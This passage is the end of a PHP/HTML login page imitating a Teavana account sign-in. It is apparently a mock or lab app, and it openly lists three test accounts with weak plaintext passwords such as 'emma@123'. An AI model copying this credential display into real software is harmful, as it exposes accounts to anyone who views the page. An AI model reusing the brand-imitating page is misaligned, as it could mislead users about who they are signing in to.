        <div style="font-size:1.6rem;font-weight:800;color:#2D4A1E;font-style:italic;letter-spacing:.03em;">teavana</div>
      </div>
      <div class="tv-login-card">
        <div class="tv-login-title">Sign In to Your Account</div>

        <?php if ($error): ?>
        <div class="tv-error-banner"><?= esc($error) ?></div>
        <?php endif; ?>

        <form method="POST" action="/index.php">
          <div class="tv-field">
            <label>Email Address</label>
            <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
          </div>
          <div class="tv-field">
            <label>Password</label>
            <input type="password" name="password" placeholder="Your password" required autocomplete="current-password">
          </div>
          <button type="submit" class="tv-login-submit">Sign In</button>
        </form>

        <div style="background:#F5F3EF;border:1px solid #E5E0D6;border-radius:6px;padding:10px 12px;margin-top:14px;font-size:11px;">
          <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#8C7B60;margin-bottom:8px;">📋 Test Accounts</div>
          <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #E5E0D6;"><span style="color:#5C4A32;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">emma@teavana.com</span><span style="font-family:monospace;font-weight:700;color:#2D4A1E;font-size:11px;white-space:nowrap;">emma@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E8F5E9;color:#2D4A1E;white-space:nowrap;">User</span></div>
          <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #E5E0D6;"><span style="color:#5C4A32;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">james@teavana.com</span><span style="font-family:monospace;font-weight:700;color:#2D4A1E;font-size:11px;white-space:nowrap;">james@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E8F5E9;color:#2D4A1E;white-space:nowrap;">User</span></div>
          <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#5C4A32;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">aria@teavana.com</span><span style="font-family:monospace;font-weight:700;color:#2D4A1E;font-size:11px;white-space:nowrap;">aria@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E8F5E9;color:#2D4A1E;white-space:nowrap;">User</span></div>
        </div>

        <div class="tv-login-or">or</div>

        <button style="width:100%;background:#f5f3ef;border:1px solid #ddd;border-radius:3px;padding:9px;font-size:.82rem;color:#888;cursor:default;font-family:inherit;" disabled>
          Continue with Google (disabled)
        </button>

        <div class="tv-login-sub" style="margin-top:14px;">
          Don't have an account? <a href="#">Create one</a>
          &nbsp;·&nbsp; <a href="#">Forgot password?</a>
        </div>
      </div>
      <div style="text-align:center;margin-top:16px;font-size:.68rem;color:#aaa;">
        © 2016 Teavana Holdings, Inc. All rights reserved.
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

</body>
</html>
